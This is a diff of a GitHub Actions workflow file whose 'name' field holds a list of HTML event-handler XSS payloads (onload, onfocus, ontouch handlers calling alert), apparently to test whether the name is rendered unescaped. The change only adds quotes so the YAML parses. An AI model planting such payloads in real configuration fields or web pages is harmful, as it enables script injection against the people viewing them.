@@ -1,6 +1,6 @@
 # This is a basic workflow to help you get started with Actions
 
-name: <body onload=alert(/XSS/.source)>
+name: '<body onload=alert(/XSS/.source)>
 <input autofocus onfocus=alert(1)>
 <select autofocus onfocus=alert(1)>
 <textarea autofocus onfocus=alert(1)>
@@ -15,7 +15,7 @@ name: <body onload=alert(/XSS/.source)>
 
 <body ontouchstart=alert(1)> // Triggers when a finger touch the screen
 <body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
-<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
+<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.'
 
 # Controls when the workflow will run
 on:
